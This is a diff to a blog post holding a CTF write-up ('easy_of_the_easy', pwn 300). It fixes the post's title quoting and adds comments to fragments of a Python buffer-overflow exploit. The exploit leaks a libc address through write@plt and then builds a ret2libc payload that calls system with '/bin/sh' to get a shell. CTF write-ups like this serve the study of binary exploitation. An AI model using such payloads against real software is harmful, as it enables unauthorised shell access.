@@ -1,6 +1,6 @@
 ---
 layout: post
-title: ! [h3x0r CTF] easy_of_the_easy (pwn 300)
+title: ! '[h3x0r CTF] easy_of_the_easy (pwn 300)'
 excerpt_separator: <!--more-->
 tags:
   - CTF
@@ -83,7 +83,7 @@ def bof() :
 	payload = "A"*18
 	payload += "B"*4
 	payload += p32(write_plt)
-	payload += p32(special_menu_addr)
+	payload += p32(special_menu_addr) # +@ RET
 	payload += p32(0x01)
 	payload += p32(read_got)
 	# payload += p32(0x08048b48) # good
@@ -94,7 +94,7 @@ def givemeshell() :
 	payload = "A"*18
 	payload += "B"*4
 	payload += p32(system_addr)
-	payload += "C"*4
+	payload += "C"*4 # Garbage RET
 	payload += p32(binsh_addr)
 	payload += "D"*20
 	r.sendline(payload)
